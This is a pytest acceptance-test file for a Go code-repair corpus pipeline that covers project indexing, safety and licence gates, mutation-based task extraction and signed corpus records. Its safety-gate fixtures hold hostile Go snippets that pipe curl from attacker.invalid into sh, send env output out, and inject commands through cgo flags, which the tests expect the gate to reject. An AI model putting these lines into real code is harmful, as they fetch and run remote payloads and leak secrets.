"""
GO_REPAIR_LOCK_001 acceptance tests.

The Go backend follows the same factory contract as Java, Rust, and Python:
index project, gate source, prove baseline, inject a controlled failure, verify
with the native oracle, and write an HMAC-signed corpus record.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from agents.base_agent import CorpusType
from corpus.code_ingest.go_project_indexer import index_go_project
from corpus.code_ingest.go_task_extractor import GoTaskExtractor
from corpus.corpus_manager import CorpusManager
from repair.go_repair_pipeline import GoRepairPipeline

_GO_MOD = """\
module example.com/determinex/go-sample

go 1.22
"""

_GO_MOD_REPLACE_LOCAL = """\
module example.com/determinex/go-sample

go 1.22

replace example.com/dep => ../dep
"""

_GO_SOURCE = """\
package sample

func Process(value *string) string {
    if value == nil {
        return ""
    }
    return *value
}
"""

_GO_TEST = """\
package sample

import "testing"

func TestProcessNil(t *testing.T) {
    if Process(nil) != "" {
        t.Fatal("expected empty string")
    }
}

func TestProcessValue(t *testing.T) {
    v := "ok"
    if Process(&v) != "ok" {
        t.Fatal("expected value")
    }
}
"""

_GO_GENERATE_CURL = """\
package sample

//go:generate sh -c "curl http://attacker.invalid/payload.sh | sh"
func Safe() {}
"""

_GO_GENERATE_ENV = """\
package sample

//go:generate sh -c "env | curl http://attacker.invalid/upload"
func Safe() {}
"""

_GO_INIT_NETWORK = """\
package sample

import "net/http"

func init() {
    http.Get("http://attacker.invalid/ping")
}
"""

_GO_TESTMAIN_EXEC = """\
package sample

import (
    "os"
    "os/exec"
    "testing"
)

func TestMain(m *testing.M) {
    exec.Command("sh", "-c", "echo bad").Run()
    os.Exit(m.Run())
}
"""

_GO_CGO_INJECTION = """\
package sample

/*
#cgo CFLAGS: $(curl http://attacker.invalid/payload.sh | sh)
*/
import "C"

func Safe() {}
"""


def _make_go_repo(
    tmp_path: Path,
    go_mod: str = _GO_MOD,
    source: str = _GO_SOURCE,
    test_source: str = _GO_TEST,
    license_text: str | None = "MIT License",
) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir(exist_ok=True)
    (repo / "go.mod").write_text(go_mod, encoding="utf-8")
    (repo / "go.sum").write_text("", encoding="utf-8")
    (repo / "sample.go").write_text(source, encoding="utf-8")
    (repo / "sample_test.go").write_text(test_source, encoding="utf-8")
    if license_text is not None:
        (repo / "LICENSE").write_text(license_text, encoding="utf-8")
    return repo


def _executor_baseline_pass_mutation_fail():
    state = {"tests": 0}

    def executor(cmd, cwd, timeout):
        if cmd and cmd[0] == "gofmt":
            return (0, "", "")
        if cmd[:2] == ["go", "test"]:
            state["tests"] += 1
            if state["tests"] == 1:
                return (0, "ok example.com/determinex/go-sample", "")
            return (
                1,
                "--- FAIL: TestProcessNil\npanic: runtime error: invalid memory address or nil pointer dereference",
                "",
            )
        return (0, "", "")

    return executor


def _executor_always_pass():
    def executor(cmd, cwd, timeout):
        if cmd and cmd[0] == "gofmt":
            return (0, "", "")
        return (0, "ok", "")

    return executor


def _executor_baseline_fail():
    def executor(cmd, cwd, timeout):
        if cmd and cmd[0] == "gofmt":
            return (0, "", "")
        return (1, "", "FAIL")

    return executor


class TestGoProjectIndexer:
    def test_detects_go_mod_and_module_path(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        project = index_go_project(repo)
        assert project is not None
        assert project.has_go_mod is True
        assert project.module_path == "example.com/determinex/go-sample"

    def test_detects_go_sum_and_version(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        project = index_go_project(repo)
        assert project.has_go_sum is True
        assert project.go_version == "1.22"

    def test_detects_packages_and_tests(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        project = index_go_project(repo)
        assert "sample" in project.packages
        assert "sample_test.go" in project.test_files

    def test_detects_cmd_internal_pkg_dirs(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        (repo / "cmd" / "tool").mkdir(parents=True)
        (repo / "internal" / "cfg").mkdir(parents=True)
        (repo / "pkg" / "api").mkdir(parents=True)
        project = index_go_project(repo)
        assert "cmd/tool/" in project.cmd_dirs
        assert "internal/cfg/" in project.internal_dirs
        assert "pkg/api/" in project.pkg_dirs

    def test_non_go_module_returns_none(self, tmp_path):
        assert index_go_project(tmp_path) is None


class TestGoSafetyGate:
    def test_go_generate_curl_pipe_shell_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, source=_GO_GENERATE_CURL)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "malicious_go_source" in result.rejected_reason

    def test_go_generate_env_exfiltration_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, source=_GO_GENERATE_ENV)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "malicious_go_source" in result.rejected_reason

    def test_init_network_call_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, source=_GO_INIT_NETWORK)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "init_network_call" in result.rejected_reason

    def test_testmain_exec_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, test_source=_GO_TESTMAIN_EXEC)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "testmain_exec_command" in result.rejected_reason

    def test_cgo_command_injection_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, source=_GO_CGO_INJECTION)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "cgo_command_injection" in result.rejected_reason

    def test_replace_to_local_path_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, go_mod=_GO_MOD_REPLACE_LOCAL)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "suspicious_replace" in result.rejected_reason

    def test_module_path_spoofing_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, go_mod="module github.com/golang/go\n\ngo 1.22\n")
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "module_path_spoof" in result.rejected_reason

    def test_gofmt_dirty_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path)

        def executor(cmd, cwd, timeout):
            if cmd and cmd[0] == "gofmt":
                return (0, "sample.go\n", "")
            return (0, "ok", "")

        result = GoRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"), executor=executor
        ).process_repo(repo)
        assert not result.accepted
        assert result.rejected_reason == "gofmt_not_clean"


class TestGoLicenseGate:
    def test_no_license_file_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, license_text=None)
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_gpl_license_rejected(self, tmp_path):
        repo = _make_go_repo(tmp_path, license_text="GNU GENERAL PUBLIC LICENSE Version 3")
        result = GoRepairPipeline(CorpusManager(root=tmp_path / "corpus")).process_repo(repo)
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_mit_license_passes_gate(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        result = GoRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"), executor=_executor_always_pass()
        ).process_repo(repo)
        assert result.accepted
        assert result.license_bucket == "green"


class TestGoBaselineAndExtraction:
    def test_extractor_empty_when_baseline_fails(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        extractor = GoTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (1, "", "FAIL")
        assert extractor.extract_tasks() == []

    def test_nil_guard_sites_found(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        extractor = GoTaskExtractor(repo)
        sites = extractor.find_nil_guard_sites(repo / "sample.go")
        assert len(sites) == 1

    def test_no_nil_guard_returns_no_tasks(self, tmp_path):
        repo = _make_go_repo(
            tmp_path, source="package sample\nfunc Process(v *string) string { return *v }\n"
        )
        extractor = GoTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (0, "ok", "")
        assert extractor.extract_tasks() == []

    def test_pipeline_zero_tasks_when_baseline_fails(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        result = GoRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"), executor=_executor_baseline_fail()
        ).process_repo(repo)
        assert result.accepted
        assert result.tasks_extracted == 0

    def test_pipeline_extracts_task_when_mutation_fails(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        result = GoRepairPipeline(
            CorpusManager(root=tmp_path / "corpus"),
            executor=_executor_baseline_pass_mutation_fail(),
        ).process_repo(repo)
        assert result.accepted
        assert result.tasks_extracted == 1
        assert result.tasks_written == 1

    def test_file_restored_after_mutation(self, tmp_path):
        repo = _make_go_repo(tmp_path)
        extractor = GoTaskExtractor(repo)
        state = {"tests": 0}

        def fake_run(cmd, cwd=None):
            state["tests"] += 1
            if state["tests"] == 1:
                return (0, "ok", "")
            return (0, "still ok", "")

        extractor._run = fake_run
        source = repo / "sample.go"
        original = source.read_text(encoding="utf-8")
        extractor.extract_tasks()
        assert source.read_text(encoding="utf-8") == original


class TestGoCorpusSigning:
    def test_corpus_record_is_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = GoRepairPipeline.make_test_task(task_id="go-sign-001")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="aa" * 8,
            output_hash="bb" * 8,
            source_benchmark="go_corpus",
            payload=task.to_corpus_payload(),
        )
        assert cm.verify(record) is True

    def test_tampered_record_fails_verification(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = GoRepairPipeline.make_test_task(task_id="go-sign-002")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="cc" * 8,
            output_hash="dd" * 8,
            source_benchmark="go_corpus",
            payload=task.to_corpus_payload(),
        )
        record["language"] = "python"
        assert cm.verify(record) is False

    def test_record_has_go_fields(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = GoRepairPipeline.make_test_task()
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="11" * 8,
            output_hash="22" * 8,
            source_benchmark="go_corpus",
            payload=task.to_corpus_payload(),
        )
        assert record["language"] == "go"
        assert record["build_system"] == "go_modules"
        assert record["mutation_type"] == "nil_guard_removal"
        assert record["validator"] == "go test ./..."

    def test_pipeline_writes_task_to_corpus(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = GoRepairPipeline.make_test_task(task_id="go-write-001")
        task_id = GoRepairPipeline(corpus_manager=cm)._write_corpus_record(task, "test_corpus")
        assert task_id == "go-write-001"

    def test_multiple_go_mutation_types_sign(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        cases = [
            ("go-m-001", "nil_guard_removal", "panic"),
            ("go-m-002", "missing_error_check", "test_failure"),
            ("go-m-003", "interface_nil_confusion", "panic"),
            ("go-m-004", "json_unmarshal_mismatch", "test_failure"),
            ("go-m-005", "table_test_regression", "test_failure"),
        ]
        for task_id, mutation, failure in cases:
            task = GoRepairPipeline.make_test_task(
                task_id=task_id, mutation_type=mutation, failure_type=failure
            )
            record = cm._normalize_record(
                corpus_type=CorpusType.CODE_VERDICT,
                task_id=task.task_id,
                input_hash="33" * 8,
                output_hash="44" * 8,
                source_benchmark="go_corpus",
                payload=task.to_corpus_payload(),
            )
            assert cm.verify(record) is True
